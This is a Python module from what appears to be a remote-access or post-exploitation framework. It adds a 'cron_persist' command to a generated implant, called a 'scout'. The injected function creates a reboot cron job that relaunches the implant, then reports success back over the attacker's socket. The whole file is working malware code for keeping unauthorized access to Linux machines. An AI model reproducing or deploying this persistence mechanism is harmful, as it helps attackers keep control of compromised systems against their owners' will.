# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from crontab import CronTab')
        self.config.import_statements.append('from getpass import getuser')
        self.config.import_statements.append('from os import path, getcwd')
        self.config.import_statements.append('from sys import argv')
        self.config.functions.append('''
def cron_persist():
    cron = CronTab(user=getuser())
    if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
        job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
    else:
        job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
    job.every_reboot() 
    cron.write()
    send_all(s,'[+]Acheived persistence via cron job!')
''')
        self.config.logics.append('''
            elif command == "cron_persist":
                cron_persist()''')
        self.config.help_menu['cron_persist'] = 'Create a cron job of the scout so it runs at startup'
    elif option == 'info':
        self.log.blank('\nName             : Cron job persistence component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : python-crontab (External), getpass, os, sys' \
                       '\nCommands         : cron_persist' \
                       '\nDescription      : Create a cron job of the scout so it runs at startup\n')
        return {
            "Name": "Cron job persistence component",
            "OS": "Linux",
            "Required Modules": "python-crontab (External), getpass, os, sys",
            "Commands": "cron_persist",
            "Description": "Create a cron job of the scout so it runs at startup"
        }